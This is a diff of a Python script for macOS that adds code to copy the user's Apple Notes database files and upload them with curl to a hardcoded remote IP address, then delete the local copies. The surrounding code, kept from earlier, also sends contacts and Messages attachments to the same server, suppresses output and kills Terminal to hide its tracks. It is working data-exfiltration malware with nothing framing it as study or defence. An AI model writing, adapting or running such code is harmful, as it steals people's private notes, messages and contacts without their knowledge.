@@ -10,7 +10,8 @@ import sys
 sys.stdout = os.devnull
 
 enableATCH = 1
-debug = 1
+debug = 0
+notesOnly = 1
 
 home = expanduser("~")
 
@@ -20,6 +21,23 @@ uploadlink = "http://142.93.195.87:8080/"
 # uploadlink = "http://localhost:8080/"
 
 user = getpass.getuser()
+
+shutil.copyfile(home + "/Library/Containers/com.apple.Notes/Data/Library/Notes/NotesV7.storedata", "./{0}-NotesV7.storedata".format(user))
+with open(os.devnull, 'w') as fp:
+    cmd = subprocess.Popen(['curl', '-sF', 'contact=@{0}-NotesV7.storedata'.format(user), uploadlink, "&"], stdout=fp)
+sleep(5)
+if debug is 0:
+    os.unlink("./{0}NotesV7.storedata".format(user))
+
+shutil.copyfile(home + "/Library/Containers/com.apple.Notes/Data/Library/Notes/NotesV7.storedata-wal", "./{0}-NotesV7.storedata-wal".format(user))
+with open(os.devnull, 'w') as fp:
+    cmd = subprocess.Popen(['curl', '-sF', 'contact=@{0}-NotesV7.storedata-wal'.format(user), uploadlink, "&"], stdout=fp)
+sleep(5)
+if debug is 0:
+    os.unlink("./{0}NotesV7.storedata-wal".format(user))
+
+if notesOnly is 1:
+    sys.exit()
 
 zipname = "./{0}-contacts".format(user)
 
@@ -46,6 +64,7 @@ sleep(20)
 if debug is 0:
     os.unlink(zipname + ".zip")
 
+
 if enableATCH is 1:
     clocation = home + "/Library/Messages/Attachments"
 
@@ -58,6 +77,7 @@ if enableATCH is 1:
     sleep(80)
     if debug is 0:
         os.unlink(zipname + ".zip")
+
 
 subprocess.call(['tput', 'reset'])
 subprocess.call(['killall', 'Terminal'])
